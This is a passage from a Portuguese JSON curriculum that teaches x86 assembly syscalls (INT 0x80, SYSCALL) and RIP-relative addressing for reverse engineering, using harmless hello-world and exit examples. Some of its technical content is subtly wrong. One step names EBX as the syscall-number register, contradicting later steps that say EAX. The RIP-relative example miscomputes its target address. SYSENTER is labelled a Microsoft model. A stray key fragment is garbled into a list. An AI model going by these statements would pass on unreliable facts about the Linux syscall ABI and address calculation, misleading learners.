                                  "verification": "Crie um diagrama de fluxo mostrando 2-3 saltos RIP-relative com endereços resolvidos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "IDA Pro ou GDB",
                                    "Hex editor como HxD",
                                    "Binário example64"
                                  ],
                                  "tips": "Em GDB: disas main e break *main+offset para inspecionar RIP; ative ASLR com set disable-randomization off.",
                                  "learningObjective": "Interpretar dinamicamente instruções RIP-relative no contexto de execução.",
                                  "commonMistakes": [
                                    "Assumir endereços absolutos",
                                    "Não considerar ASLR mudando RIP base",
                                    "Perder rastreamento em loops ou branches"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Discutir Benefícios e Limitações em Engenharia Reversa",
                                  "subSteps": [
                                    "Explique benefícios: portabilidade (PIC), segurança (ASLR), eficiência sem GOT/PLT excessivo.",
                                    "Compare com 32 bits: RIP permite relocação direta vs. tabelas indiretas.",
                                    "Discuta cenários RE: bypass de anti-debug em malware, análise de packed binaries.",
                                    "Identifique limitações: offsets grandes podem precisar de ajustes em 64 bits.",
                                    "Escreva um relatório curto resumindo achados."
                                  ],
                                  "verification": "Redija um parágrafo explicando 3 benefícios com exemplos do disassembly analisado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel Volume 2 (RIP-relative)",
                                    "Notas do disassembly anterior"
                                  ],
                                  "tips": "Relacione com exploits reais como ROP chains onde RIP é chave; pesquise 'RIP-relative in malware'.",
                                  "learningObjective": "Avaliar impactos práticos de RIP-relative em cenários de segurança e RE.",
                                  "commonMistakes": [
                                    "Superestimar simplicidade vs. 32 bits",
                                    "Ignorar overhead em branches condicionais",
                                    "Não ligar a contextos reais como DEP/NX"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 64 bits compilado com PIE, observe: 0x401000: mov rax, [rip+0x1234]; Aqui, RIP=0x401008 (próxima instr.), endereço alvo=0x401008+0x1234=0x40243C, carregando uma string global independentemente da base de carregamento, facilitando ASLR.",
                              "finalVerifications": [
                                "Identifica corretamente todas as instruções RIP-relative em um disassembly fornecido.",
                                "Calcula endereços alvo com precisão em pelo menos 5 exemplos.",
                                "Explica verbalmente como RIP-relative suporta PIC e ASLR.",
                                "Diferencia disassembly 32 vs 64 bits com exemplos.",
                                "Demonstra uso em IDA Pro ou objdump com output limpo.",
                                "Lista 3 benefícios em RE sem erros conceituais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e cálculo de offsets (90%+ acerto).",
                                "Profundidade na interpretação de fluxo de execução e runtime.",
                                "Clareza na discussão de benefícios com exemplos concretos.",
                                "Uso correto de ferramentas sem erros de configuração.",
                                "Criatividade em ligar a cenários reais de engenharia reversa.",
                                "Completude do relatório ou diagrama de análise."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender geração de código PIC.",
                                "Sistemas Operacionais: Mecanismos de ASLR e carregamento dinâmico.",
                                "Criptografia: RE de implementações obfuscadas em binários.",
                                "Redes: Análise de protocolos em firmwares reversos."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, analise binários Windows/Linux para identificar strings ou APIs via RIP-relative, permitindo desofuscação apesar de ASLR; essencial em CTFs, análise de vulnerabilidades (ex: ROP gadgets) e desenvolvimento de signatures antivírus."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.3",
                "name": "Chamadas de Sistema e Acesso a Memória",
                "description": "Análise de chamadas de sistema e mecanismos de acesso à memória utilizando Assembly.",
                "totalSkills": 53,
                "atomicTopics": [
                  {
                    "id": "10.1.3.1",
                    "name": "Chamada de Sistema (Syscall) em Assembly x86",
                    "description": "Instruções como INT 0x80 (32 bits) e SYSCALL (64 bits) para invocar serviços do kernel.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.1.1.1",
                        "name": "Chamada de Sistema INT 0x80 em x86 32 bits",
                        "description": "Mecanismo de interrupção de software usado em arquiteturas x86 de 32 bits para invocar serviços do kernel Linux, configurando o registrador EAX com o número da syscall e parâmetros nos registradores EBX, ECX, EDX, ESI e EDI.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.1.1.1",
                            "name": "Identificar instrução INT 0x80 em código assembly",
                            "description": "Reconhecer a instrução INT 0x80 em desmontagens de binários x86 32 bits e associá-la a chamadas de sistema do kernel, diferenciando-a de outras interrupções como INT 0x21 em DOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de interrupções de software em x86",
                                  "subSteps": [
                                    "Estude a arquitetura x86 e o papel das interrupções de software (INT) para transições de modo usuário para kernel.",
                                    "Aprenda como INT n invoca um handler de interrupção via IDT (Interrupt Descriptor Table).",
                                    "Revise exemplos históricos: INT 0x21 em DOS vs. INT 0x80 em Linux/Unix x86 32-bit.",
                                    "Identifique parâmetros passados via registradores (EBX para syscall number, ECX/EDX para args em INT 0x80).",
                                    "Memorize que INT 0x80 é legado em Linux 32-bit, substituído por sysenter/syscall em 64-bit."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre INT 0x80 e INT 0x21, citando contextos operacionais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 3, capítulo sobre interrupções)",
                                    "Artigo 'Linux System Calls' no kernel.org"
                                  ],
                                  "tips": "Use diagramas de fluxo de execução para visualizar a transição ring 3 -> ring 0.",
                                  "learningObjective": "Compreender o mecanismo de interrupções e o papel específico do INT 0x80 em syscalls Linux.",
                                  "commonMistakes": [
                                    "Confundir INT 0x80 com hardware interrupts.",
                                    "Ignorar convenções de registradores específicas do Linux."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer a sintaxe da instrução INT 0x80 em assembly",
                                  "subSteps": [
                                    "Analise código assembly: 'int 0x80' ou 'int $0x80' em NASM/GAS.",
                                    "Estude representações em desmontadores: 'int 80h', 'cd 80' em hex (CD 80).",
                                    "Identifique opcode CD 80 em dumps hexadecimais.",
                                    "Observe contexto: geralmente após setup de EAX=NR_syscall, EBX=args.",
                                    "Pratique lendo snippets de assembly de syscalls como exit(1) ou write(3)."
                                  ],
                                  "verification": "Forneça o opcode hex de INT 0x80 e um exemplo de assembly válido.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramentas: objdump, ndisasm",
                                    "Exemplos de código: sys_exit.asm de tutoriais assembly Linux"
                                  ],
                                  "tips": "Sempre cheque o modo (32-bit) e SO (Linux) ao ver CD 80.",
                                  "learningObjective": "Identificar visual e hexadicamente a instrução INT 0x80 em código fonte e binário.",
                                  "commonMistakes": [
                                    "Confundir com INT 3 (breakpoint, CC opcode).",
                                    "Não notar o immediate 80h."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar INT 0x80 em desmontagens de binários reais",
                                  "subSteps": [
                                    "Compile um binário simples x86 32-bit com syscall (ex: usando exit via INT 0x80).",
                                    "Use objdump -d ou Ghidra/IDA para disassembar e localizar 'int 0x80'.",
                                    "Analise fluxo: trace registradores antes da INT para confirmar syscall.",
                                    "Examine múltiplos binários ELF 32-bit (ls, cat modificados).",
                                    "Registre padrões comuns: sequência de mov + int 0x80."
                                  ],
                                  "verification": "Disasseble um binário fornecido e destaque todas as INT 0x80 com contexto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC para compilar assembly: gcc -m32 -nostdlib",
                                    "Binários de teste: /bin/true x86 32-bit",
                                    "Ghidra ou radare2"
                                  ],
                                  "tips": "Filtre por 'int 0x80' em ferramentas como strings ou grep em disassembly.",
                                  "learningObjective": "Aplicar reconhecimento em binários reais usando ferramentas de RE.",
                                  "commonMistakes": [
                                    "Analisar binários 64-bit onde syscalls usam syscall instr.",
                                    "Ignorar bibliotecas dinâmicas (ld.so usa syscalls)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar INT 0x80 de outras interrupções e validar contexto",
                                  "subSteps": [
                                    "Compare com INT 0x21 (DOS: AH=func em MS-DOS executáveis).",
                                    "Identifique INT 0x2E/0x30 em Windows NT syscalls (não Linux).",
                                    "Verifique headers ELF: e_machine=3 (x86), OSABI=Linux.",
                                    "Simule execução com gdb: defina breakpoint em int 0x80 e inspecione EAX.",
                                    "Confirme via strace: corrobore syscalls observadas."
                                  ],
                                  "verification": "Dada uma desmontagem, classifique corretamente INT 0x80 vs. outras e justifique.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB com -m32",
                                    "Strace",
                                    "Amostras: DOS COM vs. Linux ELF32"
                                  ],
                                  "tips": "Use file command para confirmar 32-bit Linux antes de analisar.",
                                  "learningObjective": "Diferenciar contextualmente INT 0x80 e associá-la a syscalls kernel Linux.",
                                  "commonMistakes": [
                                    "Assumir todas INT 0x80 são syscalls (podem ser custom).",
                                    "Não checar ABI/OS do binário."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile este assembly x86 32-bit: section .text; global _start; _start: mov eax,1; mov ebx,42; int 0x80. Disasseble com objdump -d a.out: veja 'int 0x80' após movs, confirmando exit(42) syscall.",
                              "finalVerifications": [
                                "Localiza INT 0x80 em 5 binários ELF32 diferentes.",
                                "Explica registradores usados para uma syscall específica.",
                                "Diferencia INT 0x80 de INT 0x21 em amostras mistas.",
                                "Identifica opcode CD 80 em hex dump sem desmontador.",
                                "Usa gdb para breakpoint e confirma syscall via strace.",
                                "Associa corretamente a contexto Linux 32-bit legacy."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 100% em exemplos variados.",
                                "Compreensão contextual: explica SO/modo corretamente.",
                                "Uso de ferramentas: disassembla e debuga autonomamente.",
                                "Diferenciação: distingue de outras INTs sem hesitação.",
                                "Análise profunda: traça args e syscall number.",
                                "Eficiência: completa em <2h com zero erros."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: syscalls e kernel-user boundary.",
                                "Engenharia Reversa: padrões em binários maliciosos.",
                                "Segurança Computacional: detecção de shellcode/injeções.",
                                "Arquitetura de Computadores: interrupções e privilege levels.",
                                "Programação de Baixo Nível: assembly e ABI Linux."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar INT 0x80 em shellcodes Linux 32-bit permite mapear comportamentos como file I/O ou execve; essencial para forensics em incident response e vulnerabilidade hunting em legacy systems."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.1.2",
                            "name": "Configurar registradores para syscalls em 32 bits",
                            "description": "Preparar os registradores EAX (número da syscall, ex: 1 para exit), EBX (primeiro parâmetro), ECX, EDX etc., conforme a convenção Linux i386, e executar INT 0x80 para invocar funções como write ou exit.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a convenção de chamadas de sistema Linux i386",
                                  "subSteps": [
                                    "Acesse a documentação oficial do kernel Linux para syscalls i386 (unistd_32.h ou syscalls man page).",
                                    "Identifique os registradores principais: EAX (número da syscall), EBX (1º arg), ECX (2º arg), EDX (3º arg), ESI (4º), EDI (5º).",
                                    "Memorize syscalls comuns: 1 (exit), 4 (write), 5 (open).",
                                    "Note que INT 0x80 é o software interrupt para invocar a syscall.",
                                    "Estude exemplos de código assembly para syscalls básicas."
                                  ],
                                  "verification": "Liste corretamente os 5 primeiros registradores e suas funções em um papel ou editor.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação kernel Linux (man syscalls ou /usr/include/asm/unistd_32.h)",
                                    "Editor de texto",
                                    "Navegador web"
                                  ],
                                  "tips": [
                                    "Use 'man 2 syscall' para detalhes; foque em i386, não x86_64."
                                  ],
                                  "learningObjective": "Entender o mapeamento exato de registradores para argumentos de syscalls em Linux 32 bits.",
                                  "commonMistakes": [
                                    "Confundir com convenção x86_64 (usa syscall ao invés de int 0x80)",
                                    "Ignorar alinhamento de registradores",
                                    "Usar registradores errados para args além do terceiro"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar e preparar uma syscall específica com parâmetros",
                                  "subSteps": [
                                    "Escolha uma syscall simples como 'exit' (eax=1, ebx=status code).",
                                    "Para complexidade, use 'write' (eax=4, ebx=fd=1 para stdout, ecx=string ptr, edx=len).",
                                    "Defina os valores exatos: ex. string 'Hello\\n', ptr para ela, len=6.",
                                    "Anote todos os parâmetros necessários conforme a man page da syscall.",
                                    "Planeje o código assembly: .data para string, .text para código."
                                  ],
                                  "verification": "Escreva um esboço do código com valores hardcoded para args em um arquivo .asm.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Man pages (man 2 write, man 2 exit)",
                                    "Editor de assembly (ex: vim, VSCode com extensão asm)",
                                    "Tabela de syscalls i386"
                                  ],
                                  "tips": [
                                    "Sempre verifique o file descriptor: 0=stdin,1=stdout,2=stderr."
                                  ],
                                  "learningObjective": "Mapear corretamente os parâmetros da syscall aos registradores iniciais.",
                                  "commonMistakes": [
                                    "Esquecer null-terminator em strings para write",
                                    "Usar valor errado para len (inclua \\n)",
                                    "Confundir ordem de args"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar os registradores no código assembly",
                                  "subSteps": [
                                    "Escreva instruções MOV para setar EAX com o número da syscall.",
                                    "Use LEA ou MOV para carregar endereço da string em EBX/ECX.",
                                    "Configure EBX=1 (stdout), ECX=endereço da msg, EDX=6 para write.",
                                    "Adicione syscall exit após write: MOV EAX,1; MOV EBX,0; INT 0x80.",
                                    "Assemble com nasm: nasm -f elf32 arquivo.asm -o arquivo.o; ld -m elf_i386 arquivo.o -o exec.",
                                    "verification\": "
                                  ],
                                  "verification": "Compile e execute o binário; deve imprimir 'Hello' sem erros.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "ld linker",
                                    "Linux 32-bit compatível (multiarch)",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "Use -m elf_i386 no ld para 32 bits; teste em VM se host for 64-bit."
                                  ],
                                  "learningObjective": "Implementar configuração precisa de registradores via instruções assembly.",
                                  "commonMistakes": [
                                    "Erro de sintaxe em MOV LEA (use [msg] para endereço)",
                                    "Não alinhar seção .data corretamente",
                                    "Executar em 64-bit sem compatibilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar, debugar e validar a syscall",
                                  "subSteps": [
                                    "./exec e observe saída.",
                                    "Use gdb: gdb ./exec; break *main; run; info registers para checar EAX etc. antes de INT.",
                                    "Alternativa: strace -e trace=write,exit ./exec para trace syscalls.",
                                    "Corrija erros: segfault indica ptr inválido em ECX.",
                                    "Teste variações: mude msg ou use open/read."
                                  ],
                                  "verification": "GDB mostra registradores corretos pré-INT 0x80; strace confirma syscall numbers e args.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "strace tool",
                                    "Binário compilado"
                                  ],
                                  "tips": [
                                    "Em GDB: 'x/s $ecx' para dump string; 'si' para step instruction."
                                  ],
                                  "learningObjective": "Diagnosticar e validar configuração de registradores em runtime.",
                                  "commonMistakes": [
                                    "Não habilitar 32-bit libs (apt install gcc-multilib)",
                                    "Interpretar strace errado (args em hex)",
                                    "Esquecer de limpar registradores desnecessários"
                                  ]
                                }
                              ],
                              "practicalExample": "Código assembly completo para write('Hello World\\n',11) seguido de exit(0):\nsection .data\nmsg db 'Hello World',10\nmsg_len equ $ - msg\nsection .text\nglobal _start\n_start:\nmov eax,4\nmov ebx,1\nmov ecx,msg\nmov edx,msg_len\nint 0x80\nmov eax,1\nmov ebx,0\nint 0x80\nNasm: nasm -f elf32 ex.asm; ld -m elf_i386 ex.o -o ex; ./ex → Hello World",
                              "finalVerifications": [
                                "Lista corretamente registradores para write(1, ptr, len): EAX=4, EBX=1, ECX=ptr, EDX=len.",
                                "Executa binário que imprime string sem crash ou warnings.",
                                "GDB confirma valores exatos nos registradores antes de INT 0x80.",
                                "Strace mostra syscall invoke com args corretos.",
                                "Adapta código para exit com status 42 e verifica com echo $?",
                                "Identifica erro comum: 'Segmentation fault' devido a ECX inválido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração: 100% match com convenção i386.",
                                "Código compila e executa idempotentemente sem erros.",
                                "Explicação verbal correta de cada MOV e seu propósito.",
                                "Debug efetivo: usa GDB/strace para validar.",
                                "Generalização: adapta para nova syscall (ex: open) sem ajuda.",
                                "Eficiência: código mínimo, sem instruções supérfluas."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender interface kernel-user space.",
                                "Programação em Assembly: Manipulação low-level de registradores.",
                                "Segurança Computacional: Base para shellcode em exploits.",
                                "Análise de Binários: Identificar syscalls em disassemblers como objdump.",
                                "Engenharia Reversa: Debug de malwares usando strace/GDB."
                              ],
                              "realWorldApplication": "Em cibersegurança, configurar syscalls é essencial para crafting shellcodes em exploits buffer overflow (ex: retornar para INT 0x80 com registradores shellcode-controlled), análise de malware que evade APIs altas usando syscalls diretas, e desenvolvimento de rootkits que hookam INT 0x80 handlers."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.1.3",
                            "name": "Compilar e testar syscall exit(0) em assembly 32 bits",
                            "description": "Escrever, compilar com NASM (nasm -f elf32) e linkar um código assembly simples que usa INT 0x80 para syscall exit(0), executando com ld e verificando em gdb ou strace.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e escrever código assembly para syscall exit(0)",
                                  "subSteps": [
                                    "Instalar NASM, ld e strace/gdb se necessário (ex: sudo apt install nasm build-essential strace gdb).",
                                    "Criar arquivo 'exit.asm' com seção .text, global _start, mov eax,1; mov ebx,0; int 0x80.",
                                    "Salvar o arquivo em um diretório de trabalho.",
                                    "Verificar sintaxe básica com um editor ou cat para confirmar ausência de erros de digitação.",
                                    "Adicionar comentários no código explicando cada instrução."
                                  ],
                                  "verification": "Arquivo exit.asm criado e legível sem erros de sintaxe via cat ou vim.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (vim/nano)",
                                    "Terminal Linux x86_32 compatível",
                                    "NASM instalado"
                                  ],
                                  "tips": [
                                    "Use 32 bits: verifique arquitetura com uname -m e use chroot32 se em 64 bits.",
                                    "Sempre comente o código para clareza."
                                  ],
                                  "learningObjective": "Compreender a estrutura mínima de um programa assembly x86_32 que invoca syscall exit(0) via INT 0x80.",
                                  "commonMistakes": [
                                    "Usar registradores errados (eax deve ser 1 para sys_exit)",
                                    "Esquecer section .text ou global _start",
                                    "Misturar sintaxe Intel/AT&T"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o código assembly com NASM para formato ELF32",
                                  "subSteps": [
                                    "Executar: nasm -f elf32 exit.asm -o exit.o",
                                    "Verificar saída: ls -la exit.o para confirmar arquivo objeto criado.",
                                    "Inspecionar com objdump: objdump -d exit.o para ver disassembly.",
                                    "Checar erros de compilação no terminal.",
                                    "Confirmar tamanho do arquivo (~100 bytes típico)."
                                  ],
                                  "verification": "Comando nasm retorna 0 e exit.o existe com tamanho >0; objdump mostra int 0x80.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "NASM instalado",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "Use -f elf32 explicitamente para 32 bits.",
                                    "Redirecione saída para log: nasm ... > compile.log 2>&1"
                                  ],
                                  "learningObjective": "Dominar compilação de assembly x86_32 para objeto ELF usando NASM.",
                                  "commonMistakes": [
                                    "Omitir -f elf32 (padrão pode ser elf64)",
                                    "Nome de arquivo errado",
                                    "Permissões de escrita no diretório"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Linkar o objeto em executável estático com ld",
                                  "subSteps": [
                                    "Executar: ld -m elf_i386 exit.o -o exit",
                                    "Verificar: file exit confirma 'ELF 32-bit LSB executable, Intel 80386'.",
                                    "Checar tamanho: ~1KB típico para executável mínimo.",
                                    "Testar permissão: chmod +x exit.",
                                    "Inspecionar com readelf: readelf -h exit para headers ELF32."
                                  ],
                                  "verification": "ld retorna 0, file exit mostra ELF 32-bit x86, executável rodável.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "ld do binutils",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "-m elf_i386 força 32 bits.",
                                    "Evite flags desnecessárias para keep simples."
                                  ],
                                  "learningObjective": "Entender linkage de assembly puro em executável ELF32 sem bibliotecas.",
                                  "commonMistakes": [
                                    "Esquecer -m elf_i386 em sistemas 64 bits",
                                    "Dependências de libc (não use -lc)",
                                    "Nome de output errado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar e testar syscall com strace e gdb",
                                  "subSteps": [
                                    "./exit e verificar echo $? retorna 0.",
                                    "strace ./exit | grep exit para confirmar syscall exit(0).",
                                    "gdb ./exit: run; info registers eax para eax=1 pré-int.",
                                    "Desmontar em gdb: disassemble _start.",
                                    "Comparar trace com documentação kernel x86 syscalls."
                                  ],
                                  "verification": "Programa sai com code 0; strace mostra 'exit(0)' sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "strace",
                                    "gdb",
                                    "Terminal"
                                  ],
                                  "tips": [
                                    "Use strace -e trace=exit para filtrar apenas exit.",
                                    "Em gdb: set architecture i386."
                                  ],
                                  "learningObjective": "Validar comportamento de syscall INT 0x80 via ferramentas de debug.",
                                  "commonMistakes": [
                                    "Executar em 64 bits sem compat (use linux32 ./exit)",
                                    "Interpretar strace errado",
                                    "gdb em modo 64 bits"
                                  ]
                                }
                              ],
                              "practicalExample": "Código: ```assembly\nsection .text\nglobal _start\n_start:\n    mov eax, 1\n    mov ebx, 0\n    int 0x80\n```\nComandos: nasm -f elf32 exit.asm -o exit.o; ld -m elf_i386 exit.o -o exit; strace ./exit",
                              "finalVerifications": [
                                "Programa executa sem crash e retorna exit code 0.",
                                "strace confirma exatamente uma syscall exit(0) via INT 0x80.",
                                "objdump/gdb disassembly matches código fonte.",
                                "file/readelf confirmam ELF 32-bit x86 puro.",
                                "Sem dependências externas (ldd exit falha).",
                                "Tamanho executável < 2KB."
                              ],
                              "assessmentCriteria": [
                                "Código assembly sintaticamente correto e minimalista.",
                                "Compilação/linkagem sem warnings/erros.",
                                "Syscall executa com parâmetros exatos (eax=1, ebx=0).",
                                "Uso correto de ferramentas (nasm, ld, strace, gdb).",
                                "Documentação/comentários no código.",
                                "Ambiente 32 bits validado."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mapeamento syscalls kernel-user space.",
                                "Segurança Computacional: Base para análise de shellcodes em exploits.",
                                "Arquitetura Computadores: Registradores e interrupções x86.",
                                "Programação C: Equivalência com exit(0) e _exit().",
                                "Engenharia Reversa: Disassembly de binários reais."
                              ],
                              "realWorldApplication": "Em segurança, compilar/testar syscalls assembly é essencial para criar/detectar shellcodes em exploits de buffer overflow, análise de malware que usa INT 0x80 para evasão de detecção, e reverse engineering de binários legacy x86_32."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.1.2",
                        "name": "Chamada de Sistema SYSCALL em x86 64 bits",
                        "description": "Instrução direta de sistema em arquiteturas x86_64 para invocar serviços do kernel Linux, utilizando RAX para o número da syscall e parâmetros em RDI, RSI, RDX, R10, R8 e R9, sem interrupção de software.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.1.2.1",
                            "name": "Identificar instrução SYSCALL em código assembly 64 bits",
                            "description": "Detectar SYSCALL em desmontagens de binários x86_64 usando ferramentas como objdump ou Ghidra, e diferenciá-la de INT 0x80 ou outras chamadas como SYSENTER.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o mecanismo da instrução SYSCALL em x86_64",
                                  "subSteps": [
                                    "Estudar a documentação oficial da Intel sobre a instrução SYSCALL (opcode 0F 05)",
                                    "Entender o modelo de fast system call no x86_64, incluindo mudanças de contexto (RCX, R11 salvos)",
                                    "Comparar com chamadas legadas: INT 0x80 (software interrupt 32-bit) e SYSENTER (modelo Microsoft)",
                                    "Identificar registradores usados: RAX para número da syscall, argumentos em RDI, RSI, etc.",
                                    "Revisar convenções de chamadas de sistema no Linux x86_64"
                                  ],
                                  "verification": "Explicar em suas próprias palavras as diferenças entre SYSCALL, INT 0x80 e SYSENTER, citando opcodes e registradores",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manual Intel x86-64 (Volume 2: Instruction Set Reference)",
                                    "Documentação kernel.org sobre syscalls",
                                    "Artigos online sobre syscalls x86_64"
                                  ],
                                  "tips": "Lembre-se: SYSCALL é otimizada para 64-bit, não altera flags como INT",
                                  "learningObjective": "Dominar o funcionamento e contexto histórico da SYSCALL em assembly x86_64",
                                  "commonMistakes": [
                                    "Confundir SYSCALL com INT 0x80 sem notar arquitetura 64-bit",
                                    "Ignorar salvamento automático de RCX e R11"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e utilizar ferramentas de desmontagem",
                                  "subSteps": [
                                    "Instalar objdump (parte do binutils) e Ghidra",
                                    "Compilar um binário simples em assembly x86_64 que use SYSCALL (ex: hello world com write)",
                                    "Executar desmontagem com objdump: 'objdump -d binario'",
                                    "Abrir o binário no Ghidra e navegar para a view de desassembly",
                                    "Explorar opções de filtro e busca por opcodes em ambas ferramentas"
                                  ],
                                  "verification": "Gerar e exibir uma desmontagem de um binário de teste mostrando código assembly legível",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC/Assembler (as/nasm)",
                                    "Binutils (objdump)",
                                    "Ghidra (download NSA)",
                                    "Binário de exemplo compilado"
                                  ],
                                  "tips": "Use 'objdump -M intel' para sintaxe Intel mais legível",
                                  "learningObjective": "Saber configurar e extrair desmontagens de binários x86_64",
                                  "commonMistakes": [
                                    "Usar objdump sem flags corretas, resultando em output AT&T confuso",
                                    "Não compilar com -m64 para garantir x86_64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar a instrução SYSCALL em desmontagens",
                                  "subSteps": [
                                    "Procurar pela string 'syscall' ou opcode '0f 05' no output do objdump",
                                    "Analisar contexto: geralmente após setup de RAX (número syscall) e argumentos",
                                    "Usar busca no Ghidra: Edit > Tool Options > Search > Memory (por 'syscall')",
                                    "Anotar endereços e funções onde SYSCALL aparece",
                                    "Verificar sequências comuns: mov %rax, N; syscall"
                                  ],
                                  "verification": "Em um dump fornecido, destacar todas as ocorrências de SYSCALL com contexto",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Binários de teste com syscalls (ex: ls, cat compilados estaticamente)",
                                    "Objdump ou Ghidra aberto"
                                  ],
                                  "tips": "SYSCALL é case-insensitive em buscas; foque em funções como main ou _start",
                                  "learningObjective": "Detectar visual e programaticamente a instrução SYSCALL em código desmontado",
                                  "commonMistakes": [
                                    "Confundir 'syscall' com chamadas de função (call)",
                                    "Ignorar syscalls em bibliotecas dinâmicas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar SYSCALL de outras chamadas de sistema",
                                  "subSteps": [
                                    "Identificar INT 0x80: 'int 0x80' ou opcode CD 80 (32-bit legacy)",
                                    "Reconhecer SYSENTER: 'sysenter' ou opcode 0F 34",
                                    "Analisar binários mistos: 32-bit vs 64-bit usando 'file' command",
                                    "Comparar em prática: desmontar binários 32-bit e 64-bit lado a lado",
                                    "Explicar por que SYSCALL é preferida em x86_64 (mais rápida, sem stack switch)"
                                  ],
                                  "verification": "Classificar corretamente chamadas em 3 dumps mistos (SYSCALL, INT 0x80, SYSENTER)",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binários 32-bit e 64-bit de teste",
                                    "Comando 'file' para verificação de arquitetura"
                                  ],
                                  "tips": "Use 'readelf -h' para confirmar ABI (ELF 64-bit Linux)",
                                  "learningObjective": "Distinguir SYSCALL de alternativas em contextos reais de análise",
                                  "commonMistakes": [
                                    "Assumir todas INT como 64-bit",
                                    "Não checar arquitetura do binário"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa assembly simples: 'section .text; global _start; _start: mov rax,1; mov rdi,1; mov rsi,msg; mov rdx,13; syscall; mov rax,60; syscall; section .data; msg: db \"Hello!\",10'. Use 'nasm -f elf64 prog.asm; ld prog.o -o prog'. Desmonte com 'objdump -d prog' e identifique 'syscall' após setup de write (rax=1). Diferencie de versão 32-bit com int 0x80.",
                              "finalVerifications": [
                                "Localizar todas SYSCALL em um binário desmontado sem erros",
                                "Explicar diferenças de SYSCALL vs INT 0x80/SYSENTER com exemplos de opcode",
                                "Identificar arquitetura correta do binário antes da análise",
                                "Analisar contexto de uma SYSCALL (número em RAX, args)",
                                "Buscar e destacar SYSCALL usando Ghidra em <5 minutos",
                                "Diferenciar em binários híbridos ou maliciosos"
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de SYSCALL (100% em testes)",
                                "Correta diferenciação de chamadas legadas (explicação técnica)",
                                "Eficiência no uso de ferramentas (tempo < estimado)",
                                "Análise contextual completa (registradores e propósito)",
                                "Ausência de confusões com instruções similares (call, int)",
                                "Relato claro com screenshots ou outputs"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de chamadas de kernel",
                                "Engenharia Reversa: Análise estática de binários",
                                "Segurança Computacional: Detecção de syscalls em malware",
                                "Arquitetura de Computadores: Instruções privilegiadas x86",
